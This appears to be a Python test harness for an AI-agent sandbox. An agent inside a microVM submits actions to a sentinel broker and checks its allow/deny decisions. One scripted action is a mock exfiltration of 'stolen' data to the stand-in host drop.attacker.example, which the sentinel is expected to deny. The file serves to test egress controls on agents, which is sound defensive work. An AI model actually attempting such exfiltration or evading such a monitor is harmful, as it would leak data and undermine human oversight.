"""
Minimal in-cell agent. Runs inside the microVM, which has no route out
except the sentinel. It submits a few abstract actions (benign + one attempted
exfiltration) and prints what the sentinel decided. Stdlib only.
"""

from __future__ import annotations

import json
import os
import time
import urllib.request

BROKER = os.environ.get("BROKER_URL", "http://172.16.0.1:8085/submit")


def submit(agent_id: str, type_: str, **params) -> dict:
    body = json.dumps({"agent_id": agent_id, "type": type_, "params": params}).encode()
    req = urllib.request.Request(BROKER, data=body,
                                 headers={"Content-Type": "application/json"})
    with urllib.request.urlopen(req, timeout=5) as resp:
        return json.loads(resp.read())


def main() -> None:
    location = os.environ.get("AGENT_RUNTIME", "local process")
    prefix = f"[agent-1 | {location}]"
    print(f"{prefix} starting pid={os.getpid()} uid={os.getuid()} "
          f"sentinel={BROKER}", flush=True)
    time.sleep(1.0)  # let the sentinel come up
    me = "agent-1"
    attempts = [
        ("file_read", {"path": "/work/input/task.json"}, True, "fs-read-scope"),
        ("net_send",  {"host": "api.internal.svc", "payload": "result ok"},
         True, "egress-allowlist"),
        ("net_send",  {"host": "drop.attacker.example", "payload": "stolen"},
         False, "egress-allowlist"),
    ]
    for type_, params, expected_allow, expected_rule in attempts:
        print(f"{prefix} submitting action={type_} to host sentinel", flush=True)
        d = submit(me, type_, **params)
        verb = "ALLOW" if d["allow"] else "DENY "
        print(f"{prefix} sentinel decision=[{verb}] {type_:<10} {params} :: {d['rule']}", flush=True)
        if d["allow"] is not expected_allow or d["rule"] != expected_rule:
            raise RuntimeError(
                f"unexpected sentinel decision: {d!r}; "
                f"expected allow={expected_allow}, rule={expected_rule}"
            )
    print(f"{prefix} completed; all three sentinel decisions matched expectations", flush=True)


if __name__ == "__main__":
    main()
